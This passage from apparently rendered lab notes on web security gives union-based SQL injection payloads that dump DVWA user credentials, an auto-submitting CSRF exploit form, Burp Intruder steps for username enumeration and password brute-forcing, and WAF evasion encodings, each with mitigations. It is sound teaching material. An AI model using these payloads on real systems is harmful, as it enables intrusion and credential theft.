+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token plain">' </span><span class="token operator" style=color:#393A34>or</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>0</span><span class="token operator" style=color:#393A34>=</span><span class="token number" style=color:#36acaa>0</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>union</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>select</span><span class="token plain"> </span><span class="token boolean" style=color:#36acaa>null</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> version</span><span class="token punctuation" style=color:#393A34>(</span><span class="token punctuation" style=color:#393A34>)</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+<li class="">Check current database user:<!-- -->
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token plain">' </span><span class="token operator" style=color:#393A34>or</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>0</span><span class="token operator" style=color:#393A34>=</span><span class="token number" style=color:#36acaa>0</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>union</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>select</span><span class="token plain"> </span><span class="token boolean" style=color:#36acaa>null</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>user</span><span class="token punctuation" style=color:#393A34>(</span><span class="token punctuation" style=color:#393A34>)</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Database Enumeration</strong>:</p>
+<ul>
+<li class="">Retrieve current active database name:<!-- -->
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token plain">' </span><span class="token operator" style=color:#393A34>or</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>0</span><span class="token operator" style=color:#393A34>=</span><span class="token number" style=color:#36acaa>0</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>union</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>select</span><span class="token plain"> </span><span class="token boolean" style=color:#36acaa>null</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>database</span><span class="token punctuation" style=color:#393A34>(</span><span class="token punctuation" style=color:#393A34>)</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Table Enumeration via Information Schema</strong>:</p>
+<ul>
+<li class="">List all tables registered within <code>information_schema</code>:<!-- -->
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token plain">' </span><span class="token operator" style=color:#393A34>and</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>1</span><span class="token operator" style=color:#393A34>=</span><span class="token number" style=color:#36acaa>0</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>union</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>select</span><span class="token plain"> </span><span class="token boolean" style=color:#36acaa>null</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> table_name </span><span class="token keyword" style=color:#00009f>from</span><span class="token plain"> information_schema</span><span class="token punctuation" style=color:#393A34>.</span><span class="token keyword" style=color:#00009f>tables</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+<li class="">Filter for tables related to user authentication:<!-- -->
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token string" style=color:#e3116c>' and 1=0 union select null, table_name from information_schema.tables where table_name like '</span><span class="token keyword" style=color:#00009f>user</span><span class="token operator" style=color:#393A34>%</span><span class="token plain">'</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Column Enumeration</strong>:</p>
+<ul>
+<li class="">List columns in the identified <code>users</code> table:<!-- -->
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token string" style=color:#e3116c>' and 1=0 union select null, concat(table_name, 0x0a, column_name) from information_schema.columns where table_name = '</span><span class="token plain">users'</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Credential Dumping</strong>:</p>
+<ul>
+<li class="">Extract usernames and hashed passwords:<!-- -->
+<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token operator" style=color:#393A34>%</span><span class="token plain">' </span><span class="token operator" style=color:#393A34>and</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>1</span><span class="token operator" style=color:#393A34>=</span><span class="token number" style=color:#36acaa>0</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>union</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>select</span><span class="token plain"> </span><span class="token boolean" style=color:#36acaa>null</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> concat</span><span class="token punctuation" style=color:#393A34>(</span><span class="token plain">first_name</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>0x0a</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> last_name</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>0x0a</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>user</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> </span><span class="token number" style=color:#36acaa>0x0a</span><span class="token punctuation" style=color:#393A34>,</span><span class="token plain"> password</span><span class="token punctuation" style=color:#393A34>)</span><span class="token plain"> </span><span class="token keyword" style=color:#00009f>from</span><span class="token plain"> users</span><span class="token comment" style=color:#999988;font-style:italic>#</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=24-mitigation-strategies>2.4 Mitigation Strategies<a href=#24-mitigation-strategies class=hash-link aria-label="Direct link to 2.4 Mitigation Strategies" title="Direct link to 2.4 Mitigation Strategies" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Prepared Statements (Parameterized Queries)</strong>: Pre-compiles the SQL query structure and treats user inputs strictly as parameters, neutralizing executable SQL syntax:<!-- -->
+<div class="language-php codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-php codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token variable" style=color:#36acaa>$stmt</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>=</span><span class="token plain"> </span><span class="token variable" style=color:#36acaa>$pdo</span><span class="token operator" style=color:#393A34>-></span><span class="token function" style=color:#d73a49>prepare</span><span class="token punctuation" style=color:#393A34>(</span><span class="token string single-quoted-string" style=color:#e3116c>'SELECT * FROM users WHERE id = :id'</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><span class="token plain"></span><br/></div><div class=token-line style=color:#393A34><span class="token plain"></span><span class="token variable" style=color:#36acaa>$stmt</span><span class="token operator" style=color:#393A34>-></span><span class="token function" style=color:#d73a49>execute</span><span class="token punctuation" style=color:#393A34>(</span><span class="token punctuation" style=color:#393A34>[</span><span class="token string single-quoted-string" style=color:#e3116c>'id'</span><span class="token plain"> </span><span class="token operator" style=color:#393A34>=></span><span class="token plain"> </span><span class="token variable" style=color:#36acaa>$userId</span><span class="token punctuation" style=color:#393A34>]</span><span class="token punctuation" style=color:#393A34>)</span><span class="token punctuation" style=color:#393A34>;</span><br/></div></code></pre></div></div>
+</li>
+<li class=""><strong>Stored Procedures</strong>: Encapsulate queries with strongly typed parameters.</li>
+<li class=""><strong>Principle of Least Privilege</strong>: Run database servers with restricted user privileges (e.g., prevent reading <code>information_schema</code> or modifying schemas).</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=25-conclusion>2.5 Conclusion<a href=#25-conclusion class=hash-link aria-label="Direct link to 2.5 Conclusion" title="Direct link to 2.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Successfully executed Union-based SQL injection on DVWA, progressing from database fingerprinting to full credential extraction. Parameterized queries represent the primary defense against SQLi.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=3-practical-3-cross-site-request-forgery-csrf-attacks>3. Practical 3: Cross-Site Request Forgery (CSRF) Attacks<a href=#3-practical-3-cross-site-request-forgery-csrf-attacks class=hash-link aria-label="Direct link to 3. Practical 3: Cross-Site Request Forgery (CSRF) Attacks" title="Direct link to 3. Practical 3: Cross-Site Request Forgery (CSRF) Attacks" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=31-aim>3.1 Aim<a href=#31-aim class=hash-link aria-label="Direct link to 3.1 Aim" title="Direct link to 3.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Demonstrate how an attacker can leverage CSRF vulnerabilities to trick an authenticated user into performing unintended, unauthorized state-changing actions.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=32-theory--core-concepts>3.2 Theory & Core Concepts<a href=#32-theory--core-concepts class=hash-link aria-label="Direct link to 3.2 Theory & Core Concepts" title="Direct link to 3.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Cross-Site Request Forgery (CSRF)</strong>: An attack that abuses the browser's automatic inclusion of session cookies with cross-site requests. When an authenticated user visits an attacker-controlled page, malicious scripts submit forged requests to the vulnerable target application on the user's behalf.</li>
+<li class=""><strong>Preconditions for CSRF</strong>:<!-- -->
+<ul>
+<li class="">A relevant action (state-changing request like password or email update).</li>
+<li class="">Cookie-based session handling.</li>
+<li class="">Predictable request parameters (no unpredictable anti-CSRF token).</li>
+</ul>
+</li>
+<li class=""><strong>Flawed & Inadequate Defenses</strong>:<!-- -->
+<ul>
+<li class=""><em>Secret Cookies</em>: Browsers automatically send all cookies regardless of request origin.</li>
+<li class=""><em>POST-Only Requests</em>: Trivially bypassed via hidden auto-submitting HTML forms.</li>
+<li class=""><em>Multi-Step Transactions</em>: An attacker can predict and orchestrate each sequential step.</li>
+<li class=""><em>HTTPS</em>: Encrypts the transport channel but does not validate user intent.</li>
+<li class=""><em>Referer Header Checking Alone</em>: Often stripped by privacy extensions or spoofed.</li>
+</ul>
+</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=33-step-by-step-implementation-portswigger-web-security-academy>3.3 Step-by-Step Implementation (PortSwigger Web Security Academy)<a href=#33-step-by-step-implementation-portswigger-web-security-academy class=hash-link aria-label="Direct link to 3.3 Step-by-Step Implementation (PortSwigger Web Security Academy)" title="Direct link to 3.3 Step-by-Step Implementation (PortSwigger Web Security Academy)" translate=no>​</a></h3>
+<ol>
+<li class="">
+<p><strong>Environment Setup</strong>:</p>
+<ul>
+<li class="">Launch <strong>Burp Suite Community Edition</strong> and start a temporary project.</li>
+<li class="">Configure proxy listener on <code>127.0.0.1:8080</code> and launch the integrated Chromium browser.</li>
+<li class="">Navigate to the PortSwigger Lab: <em>"CSRF vulnerability with no defenses"</em>.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Intercepting Normal State-Changing Request</strong>:</p>
+<ul>
+<li class="">Log into the lab using account credentials (<code>wiener</code> / <code>peter</code>).</li>
+<li class="">Enable <strong>Burp Intercept</strong> under <strong>Proxy -> Intercept</strong>.</li>
+<li class="">In the lab application, change the account email to <code>test1@example.com</code> and submit.</li>
+<li class="">Inspect the captured POST request in Burp:<!-- -->
+<div class="language-http codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-http codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class=codeBlockLines_e6Vv><div class=token-line style=color:#393A34><span class="token plain">POST /my-account/change-email HTTP/1.1</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Host: vulnerable-lab.web-security-academy.net</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Cookie: session=xyz123...</span><br/></div><div class=token-line style=color:#393A34><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br/></div><div class=token-line style=color:#393A34><span class="token plain" style=display:inline-block></span><br/></div><div class=token-line style=color:#393A34><span class="token plain">email=test1%40example.com</span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Constructing the CSRF Exploit PoC</strong>:</p>
+<ul>
+<li class="">In Burp, generate or manually craft a hidden HTML form that automatically submits on page load:<!-- -->
+<div class="language-html codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#393A34;--prism-background-color:#f6f8fa><div class=codeBlockContent_QJqH><pre tabindex=0 class="prism-code language-html codeBlock_bY9V thin-scrollbar" style=color:#393A34;background-color:#f6f8fa><code class="codeBlockLines_e6Vv codeBlockLinesWithNumbering_o6Pm" style="counter-reset:line-count 0"><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>html</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">  </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>body</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>form</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>action</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>https://vulnerable-lab.web-security-academy.net/my-account/change-email</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>method</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>POST</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">      </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>input</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>type</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>hidden</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>name</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>email</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag" style=color:#00009f> </span><span class="token tag attr-name" style=color:#00a4db>value</span><span class="token tag attr-value punctuation attr-equals" style=color:#393A34>=</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag attr-value" style=color:#e3116c>pwned@attacker.com</span><span class="token tag attr-value punctuation" style=color:#393A34>"</span><span class="token tag" style=color:#00009f> </span><span class="token tag punctuation" style=color:#393A34>/></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    </span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>form</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">    </span><span class="token tag punctuation" style=color:#393A34>&lt;</span><span class="token tag" style=color:#00009f>script</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token script language-javascript"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token script language-javascript">      </span><span class="token script language-javascript dom variable" style=color:#36acaa>document</span><span class="token script language-javascript punctuation" style=color:#393A34>.</span><span class="token script language-javascript property-access">forms</span><span class="token script language-javascript punctuation" style=color:#393A34>[</span><span class="token script language-javascript number" style=color:#36acaa>0</span><span class="token script language-javascript punctuation" style=color:#393A34>]</span><span class="token script language-javascript punctuation" style=color:#393A34>.</span><span class="token script language-javascript method function property-access" style=color:#d73a49>submit</span><span class="token script language-javascript punctuation" style=color:#393A34>(</span><span class="token script language-javascript punctuation" style=color:#393A34>)</span><span class="token script language-javascript punctuation" style=color:#393A34>;</span><span class="token script language-javascript"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token script language-javascript">    </span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>script</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain">  </span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>body</span><span class="token tag punctuation" style=color:#393A34>></span><span class="token plain"></span></span><br/></div><div class="token-line codeLine_lJS_" style=color:#393A34><span class=codeLineNumber_Tfdd></span><span class=codeLineContent_feaV><span class="token plain"></span><span class="token tag punctuation" style=color:#393A34>&lt;/</span><span class="token tag" style=color:#00009f>html</span><span class="token tag punctuation" style=color:#393A34>></span></span><br/></div></code></pre></div></div>
+</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Delivering the Exploit</strong>:</p>
+<ul>
+<li class="">Navigate to the <strong>Exploit Server</strong> provided by the lab.</li>
+<li class="">Paste the exploit HTML payload into the <strong>Body</strong> section.</li>
+<li class="">Click <strong>Store</strong>, then click <strong>Deliver exploit to victim</strong>.</li>
+<li class="">The lab simulates the victim browsing the exploit page. The victim's browser automatically submits the POST request along with their valid session cookie, changing the account email to <code>pwned@attacker.com</code>.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=34-remediation>3.4 Remediation<a href=#34-remediation class=hash-link aria-label="Direct link to 3.4 Remediation" title="Direct link to 3.4 Remediation" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Anti-CSRF Tokens (Synchronizer Token Pattern)</strong>: A cryptographically strong, unpredictable token generated server-side and checked upon every state-changing request.</li>
+<li class=""><strong>SameSite Cookie Attribute</strong>: Set <code>SameSite=Strict</code> or <code>SameSite=Lax</code> on session cookies to prevent automatic cross-site transmission.</li>
+<li class=""><strong>Re-Authentication</strong>: Require current password verification before critical account updates.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=35-conclusion>3.5 Conclusion<a href=#35-conclusion class=hash-link aria-label="Direct link to 3.5 Conclusion" title="Direct link to 3.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Proved that automatic cookie attachment enables unauthorized actions when applications lack anti-CSRF token verification. Implementing cryptographically random tokens and <code>SameSite</code> cookie policies prevents CSRF.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=4-practical-4-broken-authentication--session-management>4. Practical 4: Broken Authentication & Session Management<a href=#4-practical-4-broken-authentication--session-management class=hash-link aria-label="Direct link to 4. Practical 4: Broken Authentication & Session Management" title="Direct link to 4. Practical 4: Broken Authentication & Session Management" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=41-aim>4.1 Aim<a href=#41-aim class=hash-link aria-label="Direct link to 4.1 Aim" title="Direct link to 4.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Identify and exploit flaws in authentication and session mechanisms, demonstrating credential spraying, username enumeration, and brute-force attacks.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=42-theory--core-concepts>4.2 Theory & Core Concepts<a href=#42-theory--core-concepts class=hash-link aria-label="Direct link to 4.2 Theory & Core Concepts" title="Direct link to 4.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Broken Authentication</strong>: Flaws permitting attackers to compromise passwords, keys, or session tokens, allowing them to assume identities of legitimate users.</li>
+<li class=""><strong>Common Vulnerabilities</strong>:<!-- -->
+<ul>
+<li class="">Absence of multi-factor authentication (MFA).</li>
+<li class="">Weak or predictable password policies.</li>
+<li class="">Credential stuffing and lack of rate limiting.</li>
+<li class="">Exposure of session identifiers in URLs.</li>
+<li class="">Lack of session expiration / session fixation.</li>
+</ul>
+</li>
+<li class=""><strong>Username Enumeration</strong>: Subtle discrepancies in server responses (different error messages, HTTP status codes, or response length) that reveal whether an entered username exists in the system.</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=43-step-by-step-implementation-portswigger-lab>4.3 Step-by-Step Implementation (PortSwigger Lab)<a href=#43-step-by-step-implementation-portswigger-lab class=hash-link aria-label="Direct link to 4.3 Step-by-Step Implementation (PortSwigger Lab)" title="Direct link to 4.3 Step-by-Step Implementation (PortSwigger Lab)" translate=no>​</a></h3>
+<ol>
+<li class="">
+<p><strong>Target</strong>: <em>Username enumeration via different responses</em>.</p>
+</li>
+<li class="">
+<p><strong>Reconnaissance & Enumeration</strong>:</p>
+<ul>
+<li class="">Open Burp Suite and capture a failed login attempt with an invalid username (<code>testuser</code>) and password (<code>testpass</code>).</li>
+<li class="">Notice the error message: <code>Invalid username</code>.</li>
+<li class="">Send the request to <strong>Burp Intruder</strong>.</li>
+<li class="">Set attack type to <strong>Sniper</strong> and place the payload marker on the username field.</li>
+<li class="">Load a candidate list of common usernames into the <strong>Payloads</strong> tab and start the attack.</li>
+<li class="">Sort results by <strong>Response Length</strong>. A valid username (e.g., <code>administrator</code>) yields a distinct response message: <code>Incorrect password</code>.</li>
+</ul>
+</li>
+<li class="">
+<p><strong>Password Brute-Force</strong>:</p>
+<ul>
+<li class="">Update the username field in Intruder to the confirmed valid username (<code>administrator</code>).</li>
+<li class="">Move the payload marker to the password parameter.</li>
+<li class="">Load a wordlist of candidate passwords into the <strong>Payloads</strong> tab.</li>
+<li class="">Launch the attack. Identify the single request that results in a <strong>302 Found</strong> redirect and unique response length.</li>
+<li class="">Log in using the discovered credentials to solve the lab.</li>
+</ul>
+</li>
+</ol>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=44-mitigation-strategies>4.4 Mitigation Strategies<a href=#44-mitigation-strategies class=hash-link aria-label="Direct link to 4.4 Mitigation Strategies" title="Direct link to 4.4 Mitigation Strategies" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Uniform Error Messages</strong>: Always display generic feedback such as <em>"Invalid username or password"</em>.</li>
+<li class=""><strong>Account Lockout & Rate Limiting</strong>: Temporarily lock accounts or introduce IP-based exponential delays after repeated failed attempts.</li>
+<li class=""><strong>Multi-Factor Authentication (MFA)</strong>: Require a secondary verification channel (TOTP / FIDO2).</li>
+<li class=""><strong>Secure Password Storage</strong>: Hash passwords using memory-hard adaptive hashing algorithms (Argon2id, bcrypt).</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=45-conclusion>4.5 Conclusion<a href=#45-conclusion class=hash-link aria-label="Direct link to 4.5 Conclusion" title="Direct link to 4.5 Conclusion" translate=no>​</a></h3>
+<ul>
+<li class="">Demonstrated how subtle differences in response messages permit username enumeration, followed by successful password cracking. Enforcing uniform responses and rate limiting prevents automated credential attacks.</li>
+</ul>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id=5-practical-5-web-application-firewall-waf-evasion>5. Practical 5: Web Application Firewall (WAF) Evasion<a href=#5-practical-5-web-application-firewall-waf-evasion class=hash-link aria-label="Direct link to 5. Practical 5: Web Application Firewall (WAF) Evasion" title="Direct link to 5. Practical 5: Web Application Firewall (WAF) Evasion" translate=no>​</a></h2>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=51-aim>5.1 Aim<a href=#51-aim class=hash-link aria-label="Direct link to 5.1 Aim" title="Direct link to 5.1 Aim" translate=no>​</a></h3>
+<ul>
+<li class="">Test a Web Application Firewall (WAF) and demonstrate techniques used to detect, fingerprint, and bypass firewall filtering policies.</li>
+</ul>
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=52-theory--core-concepts>5.2 Theory & Core Concepts<a href=#52-theory--core-concepts class=hash-link aria-label="Direct link to 5.2 Theory & Core Concepts" title="Direct link to 5.2 Theory & Core Concepts" translate=no>​</a></h3>
+<ul>
+<li class=""><strong>Web Application Firewall (WAF)</strong>: An intermediary proxy inspecting HTTP/HTTPS traffic to block recognized web attacks (SQLi, XSS, Path Traversal) according to predefined rule sets (e.g., OWASP ModSecurity Core Rule Set).</li>
+<li class=""><strong>WAF Evasion Principles</strong>:<!-- -->
+<ul>
+<li class=""><strong>Case Variation</strong>: Exploiting case-insensitive backend parsing (<code>sElEcT</code>, <code>&lt;sCrIpT></code>).</li>
+<li class=""><strong>Character Encoding</strong>: Using URL encoding, Double URL encoding, or Unicode transformations (<code>%2527</code>, <code>%u0027</code>).</li>
+<li class=""><strong>Inline Comment Insertion</strong>: Breaking keywords while maintaining SQL validity (<code>UN/**/ION/**/SEL/**/ECT</code>).</li>
+<li class=""><strong>Whitespace Substitution</strong>: Replacing spaces with tabs, newlines, or parenthetical groupings (<code>SELECT(username)FROM(users)</code>).</li>
+<li class=""><strong>HTTP Parameter Pollution (HPP)</strong>: Splitting payloads across repeated parameters (<code>?id=1&id=UNION&id=SELECT</code>).</li>
+</ul>
+</li>
+</ul>
+<!-- -->
+<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id=53-tools--execution>5.3 Tools & Execution<a href=#53-tools--execution class=hash-link aria-label="Direct link to 5.3 Tools & Execution" title="Direct link to 5.3 Tools & Execution" translate=no>​</a></h3>
+<ol>
+<li class="">
+<p><strong>WAF Fingerprinting with <code>wafw00f</code></strong>:</p>
+<ul>
+<li class="">Clone and run the <code>wafw00f</code> tool to determine the active firewall vendor:<!-- -->
